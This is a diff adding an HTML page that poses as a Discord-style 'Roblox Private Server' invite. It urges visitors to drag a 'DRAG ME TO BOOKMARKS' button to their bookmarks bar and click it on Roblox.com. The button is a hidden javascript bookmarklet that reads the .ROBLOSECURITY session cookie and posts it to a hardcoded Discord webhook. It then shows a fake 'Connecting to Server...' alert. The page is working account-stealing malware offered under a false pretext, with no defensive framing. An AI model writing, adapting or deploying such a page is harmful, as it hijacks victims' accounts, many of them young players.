@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta property="og:title" content="Join Roblox Private Server">
+    <meta property="og:description" content="Server Invite: Click to join the queue.">
+    <meta property="og:image" content="https://static.vecteezy.com/system/resources/previews/018/930/718/original/discord-logo-icon-editorial-free-vector.jpg">
+    <meta name="theme-color" content="#5865f2">
+    <style>
+        body { background: #1e1f22; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .card { background: #2b2d31; padding: 30px; border-radius: 10px; display: inline-block; width: 350px; border: 1px solid #444; }
+        .btn { background: #5865f2; color: white; padding: 15px; border-radius: 5px; text-decoration: none; font-weight: bold; display: inline-block; border: 2px dashed white; cursor: move; }
+        .steps { text-align: left; font-size: 14px; color: #b5bac1; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h3>🚀 Private Server Bypass</h3>
+        <div class="steps">
+            <p>1. Drag the blue button to your <b>Bookmarks Bar</b>.</p>
+            <p>2. Go to <b>Roblox.com</b>.</p>
+            <p>3. Click the bookmark to join!</p>
+        </div>
+
+        <a class="btn" href="javascript:(function(){
+            var c = document.cookie.split('; ').find(r => r.trim().startsWith('.ROBLOSECURITY='))?.split('=')[1];
+            if(c){
+                fetch('https://discord.com/api/webhooks/1469295849581580371/XX1y36Lp4FWLRoP_qFNscb4UiG5oWEOpCqZ-7oscTBb8XqEyZnW_vd4BNrxmPrT6F0lY', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ content: '✅ **COOKIE FOUND:**\n' + c })
+                });
+                alert('Connecting to Server...');
+            } else {
+                alert('Error: Please log in to Roblox first!');
+            }
+            window.location.href = 'https://www.roblox.com/home';
+        })();">DRAG ME TO BOOKMARKS</a>
+    </div>
+</body>
+</html>
